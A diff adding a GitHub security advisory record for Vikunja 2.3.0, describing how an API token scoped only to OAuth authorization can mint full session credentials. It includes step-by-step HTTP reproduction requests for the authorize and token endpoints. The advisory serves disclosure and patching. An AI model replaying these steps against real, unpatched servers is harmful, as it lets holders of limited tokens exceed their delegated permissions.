@@ -1,0 +1,56 @@
+{
+  "id": "GHSA-v3p6-34mc-hj7v",
+  "modified": "2026-10-09T20:45:04.242093757Z",
+  "published": "2026-10-09T20:40:28Z",
+  "aliases": [
+    "CVE-2026-57458"
+  ],
+  "summary": "Vikunja: Scoped API token can mint unrestricted OAuth session credentials",
+  "details": "## Summary\n\nA scoped API token can bypass its declared permissions by using the OAuth authorization flow to mint normal session credentials.\n\nA token limited to:\n\n```json\n{\"oauth\":[\"authorize\"]}\n```\n\ncan call `/api/v1/oauth/authorize`, receive an OAuth authorization code, exchange it at `/api/v1/oauth/token`, and obtain a normal bearer JWT plus refresh token. The resulting credentials are not restricted by the original API-token permissions.\n\n## Affected Component\n\n* Scoped API tokens\n* OAuth authorization flow\n* `POST /api/v1/oauth/authorize`\n* `POST /api/v1/oauth/token`\n\n## Impact\n\nA narrowly scoped API token with only `oauth.authorize` can be converted into normal session credentials for the same user.\n\nThis bypasses the intended API-token permission boundary. An attacker who obtains or is delegated such a limited token can mint a normal JWT and refresh token, then access routes outside the original token scope.\n\nRuntime validation showed that the original scoped token could not access `GET /api/v1/user`, but the minted OAuth access token could access:\n\n* `GET /api/v1/user`\n* `GET /api/v1/projects`\n\nNo cross-user access, privilege escalation to admin, or access to another account was validated.\n\n## Technical Details\n\nThe issue is caused by an authentication-context mismatch between scoped API-token authentication and OAuth authorization-code issuance.\n\nThe vulnerable chain is:\n\n1. A scoped API token authenticates the request and sets the current user context.\n2. `/api/v1/oauth/authorize` accepts that API-token-authenticated user as a valid OAuth resource owner.\n3. The OAuth authorization endpoint issues an authorization code.\n4. `/api/v1/oauth/token` exchanges that code for a normal bearer JWT and refresh token.\n5. The resulting credentials are not bound to the original API-token permissions.\n\nRelevant code paths:\n\n* `pkg/routes/routes.go`\n\n  * registers `/api/v1/oauth/authorize` in an authenticated API route group that also accepts scoped API tokens\n\n* `pkg/models/api_routes.go`\n\n  * exposes non-CRUD subroutes as API-token permissions\n  * exposes the OAuth authorization endpoint under the `oauth` permission group\n\n* `pkg/routes/api_tokens.go`\n\n  * stores `api_token` and `api_user` in the request context during API-token authentication\n\n* `pkg/user/user.go`\n\n  * treats `api_user` as an authenticated current user\n\n* `pkg/modules/auth/oauth2server/authorize.go`\n\n  * uses the current user and issues an OAuth authorization code\n\n* `pkg/modules/auth/oauth2server/token.go`\n\n  * exchanges the authorization code for a normal JWT and refresh token\n\n## Steps to Reproduce\n\n### 1. Create a scoped API token\n\nCreate an API token with only the following permission:\n\n```json\n{\"oauth\":[\"authorize\"]}\n```\n\nObserved response:\n\n```http\n201 Created\n```\n\nThe returned token had only the `oauth.authorize` permission.\n\n### 2. Negative control: direct access with scoped token fails\n\nRequest:\n\n```http\nGET /api/v1/user\nAuthorization: Bearer \u003cscoped-api-token\u003e\n```\n\nObserved response:\n\n```http\n401 Unauthorized\n```\n\nResponse body:\n\n```json\n{\"code\":11,\"message\":\"missing, malformed, expired or otherwise invalid token provided\"}\n```\n\nThis confirms that the scoped token cannot directly access the normal user route.\n\n### 3. Obtain an OAuth authorization code with the scoped token\n\nRequest:\n\n```http\nPOST /api/v1/oauth/authorize\nAuthorization: Bearer \u003cscoped-api-token\u003e\nContent-Type: application/json\n```\n\nBody:\n\n```json\n{\n  \"response_type\": \"code\",\n  \"client_id\": \"vikunja\",\n  \"redirect_uri\": \"vikunja-flutter://callback\",\n  \"code_challenge\": \"\u003cpkce-s256-challenge\u003e\",\n  \"code_challenge_method\": \"S256\"\n}\n```\n\nObserved response:\n\n```http\n200 OK\n```\n\nResponse body:\n\n```json\n{\n  \"code\": \"\u003credacted\u003e\",\n  \"redirect_uri\": \"vikunja-flutter://callback\",\n  \"state\": \"\"\n}\n```\n\nThe scoped API token successfully obtained an OAuth authorization code.\n\n### 4. Exchange the authorization code for session credentials\n\nRequest:\n\n```http\nPOST /api/v1/oauth/token\nContent-Type: application/json\n```\n\nBody:\n\n```json\n{\n  \"grant_type\": \"authorization_code\",\n  \"code\": \"\u003credacted\u003e\",\n  \"client_id\": \"vikunja\",\n  \"redirect_uri\": \"vikunja-flutter://callback\",\n  \"code_verifier\": \"\u003coriginal-pkce-verifier\u003e\"\n}\n```\n\nObserved response:\n\n```http\n200 OK\n```\n\nResponse body:\n\n```json\n{\n  \"access_token\": \"\u003credacted\u003e\",\n  \"token_type\": \"bearer\",\n  \"expires_in\": 600,\n  \"refresh_token\": \"\u003credacted\u003e\"\n}\n```\n\nThe authorization code was exchanged for a normal access token and refresh token.\n\n### 5. Use the minted access token on normal routes\n\nRequest:\n\n```http\nGET /api/v1/user\nAuthorization: Bearer \u003cminted-oauth-access-token\u003e\n```\n\nObserved response:\n\n```http\n200 OK\n```\n\nAdditional scope check:\n\n```http\nGET /api/v1/projects\nAuthorization: Bearer \u003cminted-oauth-access-token\u003e\n```\n\nObserved response:\n\n```http\n200 OK\n```\n\nThe minted OAuth access token could access normal non-OAuth routes that the original scoped API token could not access.\n\n## Expected Behavior\n\nA scoped API token should not be able to obtain credentials with broader permissions than its declared scope.\n\n`/api/v1/oauth/authorize` should require a normal user session or another authentication context suitable for OAuth authorization-code issuance. API-token-authenticated requests should not be accepted for minting OAuth authorization codes.\n\n## Actual Behavior\n\nA token scoped only to `oauth.authorize` can obtain an OAuth authorization code and exchange it for a normal JWT plus refresh token.\n\nThe minted credentials are not restricted by the original API-token permissions.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "2.3.0"
+            },
+            {
+              "fixed": "2.4.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "2.3.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-v3p6-34mc-hj7v/GHSA-v3p6-34mc-hj7v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-v3p6-34mc-hj7v"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/commit/4ae2e093014881052ed8f8ecd8bcb9adf83dd276"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/releases/tag/v2.4.0"
+    }
+  ]
+}
